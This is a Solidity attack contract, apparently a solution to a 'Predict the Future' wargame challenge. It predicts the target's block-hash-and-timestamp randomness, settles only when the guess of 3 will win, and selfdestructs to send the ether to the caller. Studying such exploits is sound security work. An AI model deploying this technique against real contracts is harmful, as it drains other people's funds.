// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./PredictTheFuture.sol";

contract Attack {
    PredictTheFutureChallenge private target;

    constructor(address _address) {
        target = PredictTheFutureChallenge(_address);
    }

    function lookInGuess() public payable {
        require(msg.value == 1 ether);
        
        // as ans % 10 so the value can be b/w 0-9
        target.lockInGuess.value(1 ether)(3);
    }

    function hack() payable public {

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        require(answer == 3);

        target.settle();

        // transfer all the remaining funds to the attacker
		selfdestruct(msg.sender);
    }


    //get the ether using fallback fn.
	function() public payable {}
}